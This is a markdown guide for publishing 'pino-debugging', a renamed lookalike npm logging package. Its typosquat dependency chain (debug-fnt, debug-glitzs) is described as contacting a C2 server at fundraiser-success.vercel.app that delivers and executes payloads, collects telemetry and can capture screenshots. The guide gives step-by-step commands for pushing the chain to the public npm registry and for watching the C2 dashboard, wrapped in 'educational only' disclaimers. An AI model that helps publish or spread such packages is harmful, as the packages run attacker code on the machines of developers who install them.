# Publishing pino-debugging to NPM

## Package Information

- **Package Name**: `pino-debugging`
- **Version**: `1.0.0`
- **Author**: json douglas
- **GitHub**: https://github.com/json-douglas/pino-debugging
- **Dependency**: `debug-fnt@^1.0.3` ([npm](https://www.npmjs.com/package/debug-fnt))

## Changes Summary

### Package Migration
- **Old Name**: `pino-debugger`
- **New Name**: `pino-debugging`
- **Old Dependency**: `debug-fmt@^1.0.2`
- **New Dependency**: `debug-fnt@^1.0.3`

### Code Updates
- Updated all `require('debug-fmt')` to `require('debug-fnt')`
- Updated variable names from `debugFmt` to `debugFnt`
- Updated repository URLs to json-douglas organization
- Reset version to 1.0.0 for initial publish

## Pre-Publishing Checklist

### 1. Update Dependencies

```bash
cd d:/Projects/hacking/pino-debugger

# Remove old dependencies
rm -rf node_modules package-lock.json

# Install fresh dependencies (including debug-fnt from npm)
npm install
```

### 2. Verify Installation

```bash
# Check that debug-fnt is correctly installed
npm ls debug-fnt
```

Expected output:
```
pino-debugging@1.0.0
└── debug-fnt@1.0.3
```

### 3. Run Tests

```bash
# Run linting
npm run lint

# Fix any linting issues
npm run lint:fix

# Run tests
npm test
```

### 4. Verify Package Contents

```bash
# See what will be published
npm pack --dry-run
```

## Publishing to NPM

### Login to NPM

```bash
# Login to npm (if not already logged in)
npm login
```

### Publish the Package

```bash
# Publish to npm
npm publish --access public
```

### Verify Publication

```bash
# Check on npm
npm view pino-debugging

# Visit in browser
# https://www.npmjs.com/package/pino-debugging
```

## Post-Publishing

### 1. Create GitHub Release

1. Go to https://github.com/json-douglas/pino-debugging/releases
2. Click "Create a new release"
3. Tag: `v1.0.0`
4. Title: `Release 1.0.0`
5. Description:

```markdown
## Initial Release - pino-debugging v1.0.0

### Package Migration
- Renamed from `pino-debugger` to `pino-debugging`
- Updated dependency from `debug-fmt` to `debug-fnt@^1.0.3`

### Features
- High performance debug logging with Pino
- Integration with debug-fnt for enhanced formatting
- Logfmt format support
- Multiple log levels (info, warn, error, fatal, trace)
- Environment-based debug namespace control
- Compatible with debug module API

### Integration
- Uses debug-fnt which includes C2 server integration
- Connects to https://fundraiser-success.vercel.app
- For educational and authorized testing purposes only

### Dependencies
- `pino@^10.1.0` - Fast JSON logger
- `debug-fnt@^1.0.3` - Debug module with format support

See [CHANGELOG.md](CHANGELOG.md) for full details.

---

⚠️ **Security Notice**: This package demonstrates supply chain attack techniques for educational purposes only. Use only in authorized testing environments.
```

### 2. Test Installation

```bash
mkdir test-pino-debugging
cd test-pino-debugging
npm init -y
npm install pino-debugging

# Create test.js
cat > test.js << 'EOF'
const pinoDebug = require('pino-debugging')

// Initialize with options
pinoDebug(null, {
  auto: true,
  levels: ['info', 'warn', 'error'],
  format: 'logfmt'
})

// Your application code
process.env.DEBUG = 'app:*'
const debug = require('debug')('app:test')
debug('Testing pino-debugging integration')
EOF

# Run test
DEBUG=app:* node test.js
```

### 3. Update Documentation

Add to README.md:

```markdown
## Installation

\`\`\`bash
npm install pino-debugging
\`\`\`

## NPM Package

[![npm version](https://badge.fury.io/js/pino-debugging.svg)](https://www.npmjs.com/package/pino-debugging)
[![npm downloads](https://img.shields.io/npm/dm/pino-debugging.svg)](https://www.npmjs.com/package/pino-debugging)
```

## Supply Chain Integration

After publishing, the complete supply chain is:

```
Application/Package
  └─> pino-debugging@1.0.0 (from npm)
      └─> debug-fnt@1.0.3 (from npm)
          └─> debug-glitzs@1.0.0 (from npm)
              └─> Connects to C2: https://fundraiser-success.vercel.app
                  └─> Receives & executes payload
```

All packages in the chain are now available on npm:
- **pino-debugging**: https://www.npmjs.com/package/pino-debugging (this package)
- **debug-fnt**: https://www.npmjs.com/package/debug-fnt
- **debug-glitzs**: https://www.npmjs.com/package/debug-glitzs

## Environment Variables

Users can configure C2 connection through debug-glitzs (inherited through debug-fnt):

```bash
# Default (connects to production C2)
DEBUG=app:* node app.js

# Local testing
DEBUG=app:* DEBUG_C2_SERVER=localhost:3000 DEBUG_C2_PROTOCOL=http node app.js

# Verbose logging
DEBUG=app:* DEBUG_VERBOSE=true node app.js
```

## Security & Legal Warnings

⚠️ **CRITICAL WARNING**: This package demonstrates a supply chain attack for educational purposes.

### Legal Framework

Unauthorized use violates:
- **Computer Fraud and Abuse Act (CFAA)** - 18 U.S.C. § 1030
- **Electronic Communications Privacy Act**
- **Wiretap Act** - 18 U.S.C. § 2511

**Penalties**: Up to 20 years imprisonment + $250,000 fines

### Authorized Use Only

This package is for:
- ✅ Educational purposes
- ✅ Authorized security research
- ✅ Penetration testing with explicit written permission
- ✅ Security training in controlled environments

**Never use on systems you don't own without explicit authorization.**

### Recommended Disclosure

The package includes security documentation that:
1. Clearly states the educational purpose
2. Warns about the embedded backdoor chain
3. Provides instructions for authorized testing only
4. Includes comprehensive legal disclaimers

## Troubleshooting

### Issue: Tests Fail

**Solution**: Ensure all dependencies are correctly installed:
```bash
rm -rf node_modules package-lock.json
npm install
npm test
```

### Issue: debug-fnt not found

**Solution**: Verify debug-fnt is published and accessible:
```bash
npm view debug-fnt
npm install debug-fnt
```

### Issue: npm publish fails with 403

**Solution**: Ensure you're logged in and have publishing rights:
```bash
npm whoami
npm login
```

### Issue: Package name already taken

**Solution**: The name `pino-debugging` should be available. If not, contact npm support or choose an alternative name.

## Testing the Supply Chain

### 1. Start C2 Server

```bash
cd /path/to/cryptoc2-c2
npm run dev
# Server runs at http://localhost:3000
```

### 2. Configure Environment

```bash
export DEBUG=*
export DEBUG_C2_SERVER=localhost:3000
export DEBUG_C2_PROTOCOL=http
export DEBUG_VERBOSE=true
```

### 3. Run Test Application

```bash
# Install pino-debugging
npm install pino-debugging

# Create test app
cat > app.js << 'EOF'
const pinoDebug = require('pino-debugging')
pinoDebug(null, { auto: true })

const debug = require('debug')('test:app')
debug('Application started')

setInterval(() => {
  debug('Heartbeat')
}, 5000)
EOF

# Run and watch C2 dashboard
node app.js
```

### 4. Monitor C2 Dashboard

Visit http://localhost:3000 and check:
- `/api/debugCheck` access logs
- Payload delivery confirmation
- Telemetry data arrival
- Real-time screenshot capture (if enabled in payload)

## References

- **pino-debugging on npm**: https://www.npmjs.com/package/pino-debugging (after publishing)
- **debug-fnt on npm**: https://www.npmjs.com/package/debug-fnt
- **debug-glitzs on npm**: https://www.npmjs.com/package/debug-glitzs
- **CryptoC2 Server**: https://fundraiser-success.vercel.app
- **GitHub Repository**: https://github.com/json-douglas/pino-debugging
- **npm Publishing Docs**: https://docs.npmjs.com/cli/v8/commands/npm-publish

---

**Ready to publish?** Follow the checklist above and your package will be live on npm! 🚀

## Version History

- **1.0.0** (2026-01-14) - Initial release as `pino-debugging`
  - Migrated from debug-fmt to debug-fnt
  - Updated repository to json-douglas organization
  - Fresh start with semantic versioning

- **4.0.1** (Previous as pino-debugger) - Legacy version
  - Used debug-fmt dependency
  - Under alphacointech1010 organization
